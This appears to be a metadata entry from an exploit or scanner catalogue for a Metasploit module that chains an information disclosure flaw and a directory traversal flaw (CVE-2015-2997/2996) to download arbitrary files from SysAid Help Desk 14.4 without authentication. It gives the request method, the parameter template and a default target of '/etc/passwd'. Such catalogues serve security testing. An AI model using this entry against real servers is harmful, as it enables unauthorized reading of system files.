my $EXPLOIT = {
  CVE => "CVE-2015-2997",
  DESCRIPTION => "\n\n        This module exploits two vulnerabilities in SysAid Help Desk that allows\n\n        an unauthenticated user to download arbitrary files from the system. First, an\n\n        information disclosure vulnerability (CVE-2015-2997) is used to obtain the file\n\n        system path, and then we abuse a directory traversal (CVE-2015-2996) to download\n\n        the file. Note that there are some limitations on Windows, in that the information\n\n        disclosure vulnerability doesn't work on a Windows platform, and we can only\n\n        traverse the current drive (if you enter C:\\afile.txt and the server is running\n\n        on D:\\ the file will not be downloaded).\n\n\n\n        This module has been tested with SysAid 14.4 on Windows and Linux.\n\n        ",
  METHOD => "POST",
  MSF_MODULE => "sysaid_file_download",
  PATH => "accountId=__ACCOUNTID__&computerId=__COMPUTERID__&",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Jun/8",
    "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt",
  ],
  TITLE => "SysAid Help Desk Arbitrary File Download",
}
VARIABLES = {
	ACCOUNTID = { DESCRIPTION => "", VALUE => "" },
	TARGETURI = { DESCRIPTION => "", VALUE => "" },
	COMPUTERID = { DESCRIPTION => "", VALUE => "" },
	FILEPATH = {
  DESCRIPTION => "Path of the file to download (escape Windows paths with a back slash)",
  VALUE => "/etc/passwd",
},
